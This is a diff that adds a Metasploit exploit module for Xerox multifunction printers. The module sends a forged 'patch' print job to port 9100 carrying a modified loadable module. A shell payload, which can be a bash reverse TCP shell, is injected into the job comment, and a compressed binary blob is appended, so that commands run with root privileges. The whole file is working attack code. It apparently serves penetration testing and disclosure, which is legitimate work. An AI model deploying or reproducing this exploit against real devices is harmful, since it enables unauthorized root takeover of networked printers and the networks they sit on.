@@ -1,0 +1,98 @@
+##
+# This module requires Metasploit: http://metasploit.com/download
+# Current source: https://github.com/rapid7/metasploit-framework
+##
+
+require 'msf/core'
+
+class Metasploit3 < Msf::Exploit::Remote
+
+  Rank = GoodRanking
+  include Msf::Exploit::Remote::Tcp
+
+  def initialize(info = {})
+    super(update_info(info,
+      'Name'            => 'Xerox Multifunction Printers (MFP) "Patch" DLM Vulnerability',
+      'Description'     => %{
+        This module exploits a vulnerability found in Xerox Multifunction Printers (MFP). By
+        supplying a modified Dynamic Loadable Module (DLM), it is possible to execute arbitrary
+        commands under root priviages.
+      },
+      'Author'          =>
+        [
+          'Deral "Percentx" Heiland',
+          'Pete "Bokojan" Arzamendi'
+        ],
+      'References'      =>
+        [
+          ['BID', '52483'],
+          ['URL', 'http://www.xerox.com/download/security/security-bulletin/1284332-2ddc5-4baa79b70ac40/cert_XRX12-003_v1.1.pdf'],
+          ['URL', 'http://foofus.net/goons/percx/Xerox_hack.pdf']
+        ],
+      'Privileged'      => true,
+      'License'         => MSF_LICENSE,
+      'Payload'         =>
+        {
+          'DisableNops' => true,
+          'Space'       => 512,
+          'Compat'      =>
+            {
+              'PayloadType' => 'cmd cmd_bash',
+              'RequiredCmd' => 'generic bash-tcp'
+            }
+        },
+      'Platform'        => ['unix'],
+      'Arch'            => ARCH_CMD,
+      'Targets'         => [['Automatic', {}]],
+      'DisclosureDate'  => 'Mar 07 2012',
+      'DefaultTarget'   => 0))
+
+    register_options(
+      [
+        Opt::RPORT(9100)
+      ], self.class)
+  end
+
+  def exploit
+    print_status("#{rhost}:#{rport} - Sending print job...")
+    firmcode = '%%XRXbegin' + "\x0A"
+    firmcode << '%%OID_ATT_JOB_TYPE OID_VAL_JOB_TYPE_DYNAMIC_LOADABLE_MODULE' + "\x0A"
+    firmcode << '%%OID_ATT_JOB_SCHEDULING OID_VAL_JOB_SCHEDULING_AFTER_COMPLETE' + "\x0A"
+    firmcode << '%%OID_ATT_JOB_COMMENT "PraedaPWN2014:' + "#{payload.encoded}" + ':"' + "\x0A"
+    firmcode << '%%OID_ATT_JOB_COMMENT "patch"' + "\x0A"
+    firmcode << '%%OID_ATT_DLM_NAME "xerox"' + "\x0A"
+    firmcode << '%%OID_ATT_DLM_VERSION "NO_DLM_VERSION_CHECK"' + "\x0A"
+    firmcode << '%%OID_ATT_DLM_SIGNATURE "ca361047da56db9dd81fee6a23ff875facc3df0e1153d325c2d217c0e75f861b"' + "\x0A"
+    firmcode << '%%OID_ATT_DLM_EXTRACTION_CRITERIA "extract /tmp/xerox.dnld"' + "\x0A"
+    firmcode << '%%XRXend' + "\x0A\x1F\x8B\x08\x00\xB1\x8B\x49\x54\x00\x03\xED"
+    firmcode << "\xD3\x41\x4B\xC3\x30\x14\x07\xF0\x9E\xFB\x29\xFE\xE2\x60\x20\x74"
+    firmcode << "\x69\x63\x37\x61\x5A\xBC\x79\x94\xDD\x3C\xC8\xA0\x59\x9B\xDA\x4A"
+    firmcode << "\xD7\xCC\xB4\xD3\x1D\xF6\xE1\x8D\xDD\x64\xB8\x83\x3B\x0D\x11\xFE"
+    firmcode << "\xBF\x43\x03\xAF\x2F\xEF\xBD\xB4\x64\xA3\xAD\xD9\x8C\xDA\xD2\x3B"
+    firmcode << "\xA3\xD0\xB9\x19\x8F\xFB\xD5\x39\x5E\xC3\x58\x4E\xBC\x48\xC6\x52"
+    firmcode << "\x5E\x87\xE3\x89\x8C\xBD\x30\x8A\xE4\x44\x7A\x08\xCF\x39\xD4\xB7"
+    firmcode << "\x75\xDB\x29\x0B\x78\xD6\x98\xEE\xB7\xBC\x53\xEF\xFF\xA9\xCB\x0B"
+    firmcode << "\xB1\xA8\x1A\xB1\x50\x6D\xE9\x17\x55\x9D\xA4\x2F\x56\xAF\x10\xD4"
+    firmcode << "\x08\x1E\x30\x9C\x59\xA5\x73\x35\x7B\x7A\x94\x61\x14\x0F\x21\xDE"
+    firmcode << "\x95\x15\xED\xCA\x98\x5A\x34\x99\x68\x74\x27\x5E\xCD\x62\x7A\x35"
+    firmcode << "\x8A\x52\xBF\x2A\xF0\x8C\xA0\xC0\xC0\xD5\xC0\xDC\xEF\x4A\xDD\xF8"
+    firmcode << "\xC0\x47\x59\xD5\x1A\x56\xAB\x1C\x75\xD5\x68\x17\xC9\x8D\x7B\x00"
+    firmcode << "\x3A\x2B\x0D\x06\x5F\x31\x6C\xB1\xEB\xF8\x06\xFC\x68\xD7\xE7\xF5"
+    firmcode << "\x65\x07\xF7\x48\x12\x84\x98\xDF\x62\x5F\x17\xC8\xCC\x72\xA9\x9A"
+    firmcode << "\x3C\x49\x0F\x95\xB6\xD9\xBA\x43\x90\x4F\xDD\x18\x32\xED\x93\x8A"
+    firmcode << "\xAA\xEF\xE8\x9A\xDC\xF5\x83\xF9\xBB\xE4\xFD\xDE\xED\xE1\xE0\x76"
+    firmcode << "\x89\x91\xD8\xEC\x6F\x82\xFB\x0C\xFE\x5F\xFF\x15\x22\x22\x22\x22"
+    firmcode << "\x22\x22\x22\x22\x22\x22\x22\x22\x22\x22\x22\x22\x22\xA2\xD3\x3E"
+    firmcode << "\x01\x5A\x18\x54\xBB\x00\x28\x00\x00"
+
+    begin
+      connect
+      sock.put(firmcode)
+      handler
+    rescue ::Timeout::Error, Rex::ConnectionError, Rex::ConnectionRefused, Rex::HostUnreachable, Rex::ConnectionTimeout, Rex::AddressInUse => e
+      print_error("#{rhost}:#{rport} - #{e.message}")
+    ensure
+      disconnect
+    end
+  end
+end
